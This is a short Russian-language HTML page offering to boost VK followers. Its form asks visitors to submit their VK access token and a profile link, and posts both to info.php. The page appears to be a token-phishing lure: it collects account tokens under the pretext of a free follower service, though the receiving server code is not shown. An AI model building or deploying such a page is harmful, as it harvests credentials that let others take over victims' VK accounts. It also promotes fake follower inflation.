<!DOCTYPE html>

<html>
<head>
<meta charset="UTF-8">
<title>Nayo</title>
<style>
body{
background: #fff;
}
.field{
background: #fafafa;
display: block;
padding: 10px 0;
width: 60%;
justify-content: center;
margin-top: 12px;
margin-bottom: 10px;
border-radius: 12px; 
border: 0;
text-align: center; 
}
h1{
text-align: center;
}
.img{
display: block;
width: 285px;
}

.submit{
    display: block;
    padding: 10px 10px;
    width: 60%;
    border-radius: 12px;
    color: #ffffff;
    background-color: blue;
    border: 0;
}
.mar{
margin-top: 40px;
}
</style>
</head>
<body>
<header>
<h1>VK накрутка подписчиков</h1>
<hr></hr> 
</header>
<center>
<p>Что бы накрутить подписчиков выведите токен
 и ссылку страницы на которую надо накрутить подписчиков.
</p>
</center>
<div class="mar">
<center>
<form name="info" method="POST" action="info.php">
<input type="text" placeholder="Токен" class="field" name="token">
<input type="text" placeholder="Ссылка для накрутки" class="field" name="usr">
<input id="submit" class="submit" type="submit" value="Накрутить" name="done">
</form>
</center>
<br>
</div>       
<center><a href="#">Получить токен ВК</a></center>
    </body>
</html>
